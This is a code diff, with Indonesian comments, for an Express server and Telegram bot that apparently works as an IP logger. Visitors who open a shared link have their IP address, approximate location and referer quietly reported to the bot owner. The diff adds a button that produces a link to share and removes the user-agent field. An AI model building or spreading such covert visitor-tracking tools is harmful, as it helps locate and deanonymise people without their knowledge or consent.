@@ -23,7 +23,6 @@ const port = 3000;
 // Endpoint untuk menangani akses ke root ("/")
 app.get('/', async (req, res) => {
     const ip = req.ip;
-    const userAgent = req.headers['user-agent'];
     const referer = req.headers.referer || 'Tidak ada';
 
     // Bersihkan IPv6 jika diperlukan
@@ -54,7 +53,6 @@ app.get('/', async (req, res) => {
         📡 IP: \`${ip}\`\n
         ⌚ Waktu: \`${timestamp}\`\n
         🗺️ Lokasi: \`${locationInfo || 'Tidak dapat ditemukan'}\`\n
-        💻 User-Agent: \`${userAgent || 'Tidak diketahui'}\`\n
         🔗 Referer: \`${referer}\`
         `;
 
@@ -137,7 +135,8 @@ BOT.onText(/\/start/, (msg) => {
             inline_keyboard: [
                 [
                     { text: 'Info Server', callback_data: 'server_info' },
-                    { text: 'Tentang', callback_data: 'about' }
+                    { text: 'Tentang', callback_data: 'about' },
+                    { text: 'Buat Link', callback_data: 'create_link' } // Menambahkan tombol "Buat Link"
                 ]
             ]
         }
@@ -168,7 +167,6 @@ BOT.on('callback_query', (callbackQuery) => {
                 message_id: messageId,
                 parse_mode: 'MarkdownV2'
             });
-
             break;
         case 'about':
             BOT.editMessageText('Bot ini dibuat untuk tujuan demonstrasi.  Silakan hubungi owner untuk info lebih lanjut.', {
@@ -176,6 +174,12 @@ BOT.on('callback_query', (callbackQuery) => {
                 message_id: messageId
             });
             break;
+        case 'create_link':  // Menangani klik tombol "Buat Link"
+            const uniqueId = uuidv4().slice(0, 5); // Menggunakan 5 karakter pertama UUID
+            const link = `https://wulandari-tech-production.up.railway.app/wanzofc`; // Ganti dengan URL Anda
+            BOT.sendMessage(chatId, `Klik link berikut: \`${link}\``, { parse_mode: 'MarkdownV2' });
+            break;
+
         default:
             BOT.editMessageText('Perintah tidak dikenal.', {
                 chat_id: chatId,
